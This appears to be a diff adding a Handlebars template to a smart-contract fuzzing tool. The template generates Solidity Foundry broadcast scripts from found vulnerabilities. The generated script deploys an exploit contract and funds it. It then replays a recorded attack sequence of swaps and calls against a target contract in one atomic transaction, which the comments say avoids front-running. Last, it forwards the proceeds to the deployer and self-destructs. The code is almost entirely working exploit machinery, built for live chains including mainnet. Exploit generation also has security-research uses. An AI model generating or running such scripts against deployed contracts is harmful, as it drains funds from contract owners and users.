@@ -1,0 +1,198 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Script.sol";
+
+{{#if is_onchain}}
+// forksploit evm -o -t {{target}} -c {{chain}} --onchain-block-number {{block_number}} -f -i -p --onchain-etherscan-api-key ${{etherscan_keyname}}
+{{else}}
+// forksploit evm -t '{{target}}' -f
+{{/if}}
+/*
+
+😊😊 Found violations! Atomic exploit script (forge script, not forge test).
+
+
+{{{solution}}}
+ */
+
+// Executes the whole attack sequence from its own identity so the
+// ExploitRunner script below can broadcast it as a single, atomic
+// transaction (deploy + fund + attack), with no front-running window
+// between steps.
+contract {{contract_name}}Exploit {
+    // Whoever deploys this (the broadcaster) is who gets the proceeds back
+    // and who's allowed to trigger cleanup.
+    address payable public beneficiary;
+
+    constructor() {
+        beneficiary = payable(msg.sender);
+    }
+
+{{#if struct_defs}}
+{{#each struct_defs}}
+    struct {{this.name}} {
+        {{#each this.props}}
+        {{{this}}};
+        {{/each}}
+    }
+{{/each}}
+
+{{/if}}
+    function attack() external {
+    {{#if router}}
+        address router = {{router}};
+
+    {{/if}}
+{{#each trace}}
+{{#with this}}
+    {{#if interface_calls}}
+        {{#each interface_calls}}
+        {{{this}}}
+        {{/each}}
+    {{else}}
+    {{#if (is_deposit buy_type)}}
+        {{#with (lookup swap_data "deposit")~}}I({{target}}).deposit{value: {{../value}}}();{{/with}}
+    {{else}}
+    {{#if (is_buy buy_type)}}
+        address[] memory path{{borrow_idx}} = new address[]();
+    {{#with (lookup swap_data "buy")~}}
+        {{#each path}}
+        path{{../../borrow_idx}}[{{@index}}] = {{{this}}};
+        {{/each}}
+    {{/with}}
+        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
+            value: {{value}}
+        }(0, path{{borrow_idx}}, address(this), block.timestamp);
+    {{else}}
+        {{contract}}.call{{#if value}}{value: {{value}}}{{/if}}(abi.encodeWithSelector(
+            {{fn_selector}}{{#if fn_args}}, {{{fn_args}}}{{/if}}
+        ));
+    {{/if}}
+    {{/if}}
+    {{#if (is_withdraw sell_type)}}
+        uint256 amount{{balance_idx}} = IERC20({{contract}}).balanceOf(address(this));
+        {{#with (lookup swap_data "withdraw")~}}I({{target}}).withdraw(amount{{../balance_idx}});{{/with}}
+    {{else}}
+    {{#if (is_sell sell_type)}}
+        uint256 amount{{balance_idx}} = IERC20({{contract}}).balanceOf(address(this));
+        IERC20({{contract}}).approve(router, amount{{balance_idx}});
+        address[] memory liq_path{{balance_idx}} = new address[]();
+    {{#with (lookup swap_data "sell")~}}
+        {{#each path}}
+        liq_path{{../../balance_idx}}[{{@index}}] = {{{this}}};
+        {{/each}}
+    {{/with}}
+        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
+            amount{{balance_idx}}, 0, liq_path{{balance_idx}}, address(this), block.timestamp
+        );
+    {{/if}}
+    {{/if}}
+    {{/if}}
+{{/with}}
+{{/each}}
+    }
+
+    // Forwards any ETH this contract is holding back to whoever deployed
+    // it, then self-destructs. NOTE: because this is always called in a
+    // SEPARATE transaction from the one that created this contract,
+    // EIP-6780 (live on every chain that's had its Dencun/Cancun upgrade,
+    // which includes Sepolia and mainnet) means SELFDESTRUCT here only
+    // zeroes out the balance -- it does NOT remove this contract's
+    // bytecode from the chain. There's no way to actually erase the code
+    // after the fact anymore; this is as much cleanup as is possible.
+    function collectAndDestroy() external {
+        require(msg.sender == beneficiary, "not beneficiary");
+        if (address(this).balance > 0) {
+            // W3: full-gas `call`, never `.transfer()`. `.transfer()` forwards
+            // only 2300 gas, which a CONTRACT beneficiary (a Gnosis Safe /
+            // multisig recovery wallet, a treasury, any receive() that writes
+            // storage) cannot run within -- the send would revert and the
+            // proceeds would be stranded in this contract.
+            (bool ok, ) = beneficiary.call{value: address(this).balance}("");
+            require(ok, "beneficiary send failed");
+        }
+        selfdestruct(beneficiary);
+    }
+
+    receive() external payable {}
+}
+
+contract {{contract_name}}ExploitRunner is Script {
+    function run() external {
+        vm.startBroadcast();
+
+        // 1. Deploy the exploit contract.
+        {{contract_name}}Exploit exploit = new {{contract_name}}Exploit();
+
+{{#if needs_funding}}
+        // 2. Fund it with the ETH the attack sequence spends internally
+        //    (deposits / swaps), so step 3 runs atomically without relying
+        //    on any test-only cheatcode.
+        payable(address(exploit)).transfer({{total_value}});
+
+{{/if}}
+        // 3. Execute the attack.
+        exploit.attack();
+
+        // 4. Forward whatever the attack collected back to this wallet
+        //    (the broadcaster, i.e. msg.sender during step 1) and
+        //    self-destruct. See the comment on collectAndDestroy() for why
+        //    this zeroes the balance but can't remove the bytecode itself.
+        exploit.collectAndDestroy();
+
+        vm.stopBroadcast();
+    }
+}
+{{#if interface}}
+
+interface I {
+{{#each interface}}
+    {{{this}}}
+{{/each}}
+}
+{{/if}}
+{{#if include_interface}}
+
+interface IERC20 {
+    function balanceOf(address owner) external view returns (uint256);
+    // Confirmed live 2026-11-01: these are matched by function NAME/
+    // signature alone in make_erc20_calls (src/evm/solution/mod.rs) --
+    // a completely different, payable contract can have a function
+    // literally named e.g. mint(address) for unrelated reasons (hit by
+    // oracles/self_referral.rs's own fixture). payable here so a
+    // real recorded value is never rejected at compile time; calling
+    // with 0 value, as a genuine ERC20/LP always will, is unaffected.
+    function approve(address spender, uint256 value) external payable returns (bool);
+    function transfer(address to, uint256 value) external payable returns (bool);
+    function transferFrom(address from, address to, uint256 value) external payable returns (bool);
+
+    function mint(address to) external payable returns (uint liquidity);
+    function burn(address to) external payable returns (uint amount0, uint amount1);
+    function skim(address to) external payable;
+    function sync() external payable;
+}
+
+interface IUniswapV2Router {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+{{/if}}
